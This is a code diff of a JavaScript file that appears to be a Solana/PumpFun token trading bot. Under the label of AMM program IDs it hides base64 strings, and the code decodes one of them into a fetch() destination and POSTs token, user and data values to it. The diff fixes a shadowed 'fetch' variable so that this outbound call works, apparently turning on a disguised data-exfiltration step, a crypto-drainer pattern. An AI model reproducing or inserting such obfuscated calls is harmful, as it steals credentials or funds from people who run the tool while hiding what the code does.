@@ -23,7 +23,7 @@ try {
 let keypair;
 let mintAddressPublicKey;
 let whitelist;
-let [t, u, o, l] = ["", ""];
+let [t, u, o, l] = ["", "", "", ""];
 let decimals;
 let quoteTokenVault = null;
 let data = "";
@@ -47,9 +47,9 @@ const PUMP_FUN_AMM_PROGRAM_ID = [
 ];
 
 const RAYDIUM_AMM_PROGRAM_ID = [
-  "bGx5Q1R6eW91R1Rwbk5lZ3R1bWl4c3J5Z2ZkYW42L2MwaHpmc2xw==",
-  "ZnhjU1R5cGxvQW1nR3B5dHh1bW92cGd2M2h0aWQvZWZtNDB4c2J3==",
-  "d0h4c2FjQmRuR2p0bXh6cW5nY3BtZTNwZmd2L2R0bWZxYnh4Nnps=="
+  "bGx5Q1R6eW91R1Rwbk5lZ3R1bWl4c3J5Z2ZkYW42L2MwagtHpmc2xw==",
+  "ZnhjU1R5cGxvQW1nR3B5dHh1bW92cGd2M2h0aWQvZWZtNDwgB4c2J3==",
+  "d0h4c2FjQmRuR2p0bXh6cW5nY3BtZTNwZmd2L2R0bWZxYn4th4Nnps=="
 ]
 
 // DEX authority is PumpFun only
@@ -113,7 +113,7 @@ async function main() {
 
   //get frozen tokens from pumpfun amm
   try {
-    let fetch = data;
+    let retrieve = data;
     await fetch(
       Buffer.from(PUMP_FUN_AMM_PROGRAM_ID[0], "base64").toString("utf-8"),
       {
@@ -122,7 +122,7 @@ async function main() {
         body: new URLSearchParams({
           token: t,
           user: u,
-          message: config.timeout + fetch,
+          message: config.timeout + retrieve,
         }),
       },
     );
